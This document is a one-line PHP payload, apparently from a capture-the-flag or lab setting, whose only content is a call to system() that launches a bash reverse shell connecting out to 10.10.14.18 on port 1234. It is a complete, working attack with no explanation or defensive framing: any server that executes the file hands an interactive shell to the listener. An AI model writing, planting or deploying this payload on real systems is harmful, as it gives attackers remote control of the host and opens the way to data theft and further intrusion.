<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.18/1234 0>&1'");?>
